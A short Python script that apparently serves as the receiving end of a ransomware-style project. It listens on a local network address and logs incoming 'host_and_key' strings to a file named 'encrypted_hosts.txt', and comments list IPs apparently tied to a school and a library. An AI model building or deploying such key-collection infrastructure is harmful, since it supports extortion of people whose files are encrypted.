import socket


# IP_ADDRESS = '192.168.64.1'
# my ip
IP_ADDRESS = '192.168.162.190'
# begula hs IP_ADDRESS = '192.168.24.190'
# ism library IP_ADDRESS = '172.17.29.30'
PORT = 5678

print('Creating Socket')
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((IP_ADDRESS, PORT))
    print('Listening for connections...')
    s.listen(1)
    conn, addr = s.accept()
    print(f'Connection from {addr} established!')
    with conn:
        while True:
            host_and_key = conn.recv(1024).decode()
            with open('encrypted_hosts.txt', 'a') as f:
                f.write(host_and_key + '\n')
            break
        print('Connection completed and closed')
